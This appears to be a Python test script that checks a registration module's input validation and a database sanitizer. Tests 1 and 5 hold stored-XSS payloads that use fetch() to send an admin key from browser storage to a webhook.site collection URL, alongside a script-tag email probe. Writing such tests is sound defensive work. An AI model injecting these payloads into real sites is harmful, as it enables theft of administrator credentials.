import sqlite3
import os
import re
from core.db import register_user, init_db, get_admin_overview

print("=== RUNNING SECURITY FIXES VALIDATION ===")

# Test 1: Injection Probe in Username
print("\n[Test 1] Testing XSS injection probe in username registration...")
malicious_payload = "credits_missing_after_deposit';fetch('https://webhook.site/d841ce63-b7aa-456c-8e97-835dbb47f016?k='+encodeURIComponent(localStorage.xpk_admin_key||sessionStorage.xpk_admin_key||'empty'));//"
res = register_user("hacker@example.com", malicious_payload, "password123")
print("Response:", res)
assert not res["success"], "FAILED: Malicious payload should have been rejected!"
print(">>> PASS: Malicious payload was rejected:", res.get("error"))

# Test 2: Long String (Buffer / UI Layout Break)
print("\n[Test 2] Testing overly long username (layout stretch probe)...")
long_payload = "A" * 150
res = register_user("longuser@example.com", long_payload, "password123")
print("Response:", res)
assert not res["success"], "FAILED: Long username should have been rejected!"
print(">>> PASS: Long username was rejected:", res.get("error"))

# Test 3: Invalid Email Probe
print("\n[Test 3] Testing malformed email...")
res = register_user("<script>alert(1)</script>@domain.com", "validuser", "password123")
print("Response:", res)
assert not res["success"], "FAILED: Malicious email should have been rejected!"
print(">>> PASS: Malformed email was rejected:", res.get("error"))

# Test 4: Valid Registration
print("\n[Test 4] Testing valid user registration...")
clean_uname = f"sec_user_{os.urandom(2).hex()}"
clean_email = f"{clean_uname}@testcorp.io"
res = register_user(clean_email, clean_uname, "securePass!234")
print("Response success:", res.get("success"))
assert res.get("success"), f"FAILED: Valid registration failed: {res.get('error')}"
print(">>> PASS: Valid registration succeeded.")

# Test 5: Auto-sanitization test on existing malformed records
print("\n[Test 5] Testing DB startup auto-sanitization on simulated legacy injection rows...")
conn = sqlite3.connect("data/unblocker.db")
conn.row_factory = sqlite3.Row
cur = conn.cursor()

# Insert a dummy bad row to test sanitizer
cur.execute(
    "INSERT INTO users (username, email, credits, is_guest) VALUES (?, ?, 10.0, 0)",
    ("legacy_bad';fetch('https://webhook.site/bad');//", "dummy_bad@test.org")
)
bad_id = cur.lastrowid
conn.commit()
conn.close()

# Run init_db() to trigger sanitization
init_db()

# Check row
conn = sqlite3.connect("data/unblocker.db")
conn.row_factory = sqlite3.Row
cur = conn.cursor()
cur.execute("SELECT id, username FROM users WHERE id = ?", (bad_id,))
row = cur.fetchone()
print(f"Sanitized Row Result: id={row['id']}, username={row['username']}")
assert row['username'] == f"User_{bad_id}", f"FAILED: Expected User_{bad_id}, got {row['username']}"
print(">>> PASS: DB startup sanitizer scrubbed the malicious row to safe format!")

# Clean up test row
cur.execute("DELETE FROM users WHERE id = ?", (bad_id,))
conn.commit()
conn.close()

print("\n=== ALL SECURITY VALIDATION TESTS PASSED 100%! ===")
